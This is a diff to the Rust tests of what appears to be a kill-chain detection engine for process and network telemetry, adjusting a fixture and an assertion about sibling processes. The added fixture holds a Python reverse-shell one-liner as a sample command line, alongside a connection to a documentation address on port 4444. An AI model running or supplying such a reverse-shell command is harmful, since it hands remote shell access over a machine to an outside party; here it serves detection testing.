@@ -41,6 +41,9 @@ fn child(ts: i64, class: EventClass) -> TelemetryEvent {
     let mut e = event(ts, class, "python3", "sh", 1000);
     e.pid = 11;
     e.ppid = 10;
+    if class == EventClass::ProcessExec {
+        e.command_line = Some("python3 -c 'import socket,os;s=socket.socket();s.connect((h,p));os.dup2(s.fileno(),0);os.system(\"/bin/sh -i\")'".into());
+    }
     if class == EventClass::NetworkConnect {
         e.dst_ip = Some("198.51.100.7".into());
         e.dst_port = Some(4444);
@@ -99,5 +102,9 @@ fn detp1_killchain_does_not_refire_a_sibling_chain_on_new_child_activity() {
     sibling.event_class = EventClass::NetworkConnect;
     sibling.dst_ip = Some("198.51.100.7".into());
     sibling.dst_port = Some(4444);
-    assert_eq!(engine.observe(&sibling).len(), 1);
+    assert_eq!(
+        engine.observe(&sibling).len(),
+        0,
+        "a sibling needs its own socket-to-stdio witness"
+    );
 }
